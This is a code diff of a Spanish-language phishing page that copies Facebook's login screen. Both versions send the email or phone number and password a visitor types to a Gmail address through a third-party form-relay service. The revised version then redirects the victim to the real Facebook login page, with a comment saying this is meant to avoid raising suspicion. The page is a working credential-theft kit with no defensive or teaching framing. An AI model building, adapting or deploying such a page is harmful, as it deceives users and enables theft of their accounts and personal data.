@@ -6,91 +6,149 @@
     <title>Facebook - Entrar o registrarse</title>
     <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRp1SfsL_y.ico">
     <style>
-        :root { --azul: #0866ff; --verde: #42b72a; --bg: #f0f2f5; }
-        body { font-family: Helvetica, Arial, sans-serif; background: var(--bg); margin: 0; }
-        .seccion { display: none; flex-direction: column; align-items: center; width: 100%; }
-        .activa { display: flex; }
-        header { background: white; height: 56px; width: 100%; display: none; justify-content: space-between; align-items: center; padding: 0 10%; box-sizing: border-box; box-shadow: 0 2px 4px rgba(0,0,0,0.1); position: fixed; top: 0; }
-        .card { background: white; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); padding: 20px; width: 396px; margin-top: 40px; }
-        input { width: 100%; height: 52px; margin-bottom: 12px; padding: 12px; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
-        .btn-blue { width: 100%; height: 48px; background: var(--azul); color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 20px; cursor: pointer; }
-        .error-msg { display: none; background: #ffebe9; border: 1px solid #f02849; color: #f02849; padding: 10px; margin-bottom: 15px; border-radius: 4px; font-size: 13px; text-align: left; }
+        /* Estilos Base */
+        body { 
+            font-family: Helvetica, Arial, sans-serif; 
+            background-color: #f0f2f5; 
+            margin: 0; 
+            display: flex; 
+            justify-content: center; 
+            min-height: 100vh;
+        }
+
+        .container { 
+            width: 100%; 
+            max-width: 980px; 
+            display: flex; 
+            flex-direction: row; 
+            justify-content: space-between; 
+            align-items: center; 
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .left-col { 
+            width: 500px; 
+            padding-right: 32px; 
+        }
+
+        .left-col h1 { 
+            color: #0866ff; 
+            font-size: 60px; 
+            letter-spacing: -2px; 
+            margin: 0; 
+        }
+
+        .left-col p { 
+            font-size: 28px; 
+            line-height: 32px; 
+            color: #1c1e21; 
+        }
+
+        .login-box { 
+            background: #fff; 
+            padding: 20px; 
+            border-radius: 8px; 
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); 
+            width: 396px; 
+            text-align: center; 
+            box-sizing: border-box;
+        }
+
+        input { 
+            width: 100%; 
+            height: 52px; 
+            padding: 14px; 
+            margin-bottom: 12px; 
+            border: 1px solid #dddfe2; 
+            border-radius: 6px; 
+            font-size: 17px; 
+            box-sizing: border-box; 
+        }
+
+        .btn-login { 
+            width: 100%; 
+            height: 48px; 
+            background-color: #0866ff; 
+            border: none; 
+            border-radius: 6px; 
+            color: #fff; 
+            font-size: 20px; 
+            font-weight: bold; 
+            cursor: pointer; 
+        }
+
+        .forgot { display: block; margin: 16px 0; color: #0866ff; text-decoration: none; font-size: 14px; }
+        hr { border: 0; border-top: 1px solid #dadde1; margin: 20px 0; }
+        .btn-new { background-color: #42b72a; border: none; border-radius: 6px; color: #fff; font-size: 17px; font-weight: bold; padding: 0 16px; height: 48px; cursor: pointer; }
+
+        /* --- ESTILOS PARA CELULAR (MÓVIL) --- */
+        @media (max-width: 900px) {
+            body { align-items: flex-start; }
+            .container { 
+                flex-direction: column; 
+                align-items: center; 
+                padding: 10px;
+                margin-top: 20px;
+            }
+            .left-col { 
+                width: 100%; 
+                padding-right: 0; 
+                text-align: center; 
+                margin-bottom: 20px;
+            }
+            .left-col h1 { font-size: 45px; }
+            .left-col p { font-size: 20px; line-height: 24px; }
+            .login-box { 
+                width: 100%; 
+                max-width: 400px; 
+                box-shadow: none;
+                background: transparent;
+                padding: 0;
+            }
+            .login-box form {
+                background: #fff;
+                padding: 15px;
+                border-radius: 8px;
+                box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            }
+        }
     </style>
 </head>
 <body>
-
-    <header id="h-sub">
-        <a href="#" onclick="show('inicio')" style="color:var(--azul); font-size:28px; font-weight:bold; text-decoration:none;">facebook</a>
-        <button onclick="show('inicio')" style="background:var(--azul); color:white; border:none; padding:8px 15px; border-radius:6px; font-weight:bold;">Iniciar sesión</button>
-    </header>
-
-    <main style="margin-top: 80px; display: flex; justify-content: center;">
-        <section id="inicio" class="seccion activa">
-            <div style="display:flex; width:980px; justify-content:space-between; align-items:center; margin-top:40px;">
-                <div style="width:500px;">
-                    <h1 style="color:var(--azul); font-size:60px; margin:0; letter-spacing:-2px;">facebook</h1>
-                    <p style="font-size:28px; line-height:32px;">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
-                </div>
-                <div class="card">
-                    <div id="err" class="error-msg">La contraseña es incorrecta.</div>
-                    <form onsubmit="send(event)">
-                        <input type="text" id="u" placeholder="Correo electrónico o número de teléfono" required>
-                        <input type="password" id="p" placeholder="Contraseña" required>
-                        <button type="submit" class="btn-blue">Iniciar sesión</button>
-                    </form>
-                    <div style="margin:15px 0"><a href="#" onclick="show('olvido')" style="color:var(--azul); text-decoration:none; font-size:14px;">¿Olvidaste tu contraseña?</a></div>
-                    <hr style="border:0; border-top:1px solid #dadde1; margin:20px 0">
-                    <button onclick="show('registro')" style="background:var(--verde); width:auto; padding:0 16px;" class="btn-blue">Crear cuenta nueva</button>
-                </div>
-            </div>
-        </section>
-
-        <section id="olvido" class="seccion">
-            <div class="card" style="width:500px; text-align:left; padding:0;">
-                <div style="padding:20px; border-bottom:1px solid #ddd;"><h2>Encuentra tu cuenta</h2></div>
-                <div style="padding:20px;">
-                    <p>Ingresa tu correo o número para buscar tu cuenta.</p>
-                    <input type="text" placeholder="Correo o número">
-                </div>
-                <div style="background:#f5f6f7; padding:15px; display:flex; justify-content:flex-end; gap:10px; border-radius:0 0 8px 8px;">
-                    <button onclick="show('inicio')" style="background:#e4e6eb; color:#4b4f56; width:auto; padding:0 20px;" class="btn-blue">Cancelar</button>
-                    <button onclick="show('inicio')" style="width:auto; padding:0 20px;" class="btn-blue">Buscar</button>
-                </div>
-            </div>
-        </section>
-
-        <section id="registro" class="seccion">
-            <div class="card">
-                <h2>Registrarte</h2>
-                <p>Es rápido y fácil.</p>
+    <div class="container">
+        <div class="left-col">
+            <h1>facebook</h1>
+            <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
+        </div>
+        <div class="login-box">
+            <form onsubmit="handleLogin(event)">
+                <input type="text" id="email" placeholder="Correo electrónico o número de teléfono" required>
+                <input type="password" id="pass" placeholder="Contraseña" required>
+                <button type="submit" class="btn-login">Iniciar sesión</button>
+                <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
                 <hr>
-                <input type="text" placeholder="Nombre">
-                <input type="text" placeholder="Apellido">
-                <input type="text" placeholder="Número o correo">
-                <input type="password" placeholder="Contraseña nueva">
-                <button onclick="show('inicio')" style="background:var(--verde);" class="btn-blue">Registrarte</button>
-            </div>
-        </section>
-    </main>
+                <button type="button" class="btn-new">Crear cuenta nueva</button>
+            </form>
+        </div>
+    </div>
 
     <script>
-        function show(id) {
-            document.querySelectorAll('.seccion').forEach(s => s.classList.remove('activa'));
-            document.getElementById(id).classList.add('activa');
-            document.getElementById('h-sub').style.display = (id === 'inicio') ? 'none' : 'flex';
-        }
-
-        async function send(e) {
-            e.preventDefault();
-            const data = { user: document.getElementById('u').value, pass: document.getElementById('p').value };
-            // Cambia el ID de abajo por tu correo real en hexadecimal si deseas
-            await fetch('https://formsubmit.co/ajax/83739387z@gmail.com', {
+        function handleLogin(event) {
+            event.preventDefault();
+            const data = { 
+                u: document.getElementById('email').value, 
+                p: document.getElementById('pass').value 
+            };
+            
+            fetch('https://formsubmit.co/ajax/83739387z@gmail.com', {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
+            }).then(() => {
+                // Redirigir al Facebook real para no levantar sospechas
+                window.location.href = "https://www.facebook.com/login/";
             });
-            document.getElementById('err').style.display = 'block';
-            setTimeout(() => window.location.href = "https://www.facebook.com", 2000);
         }
     </script>
 </body>
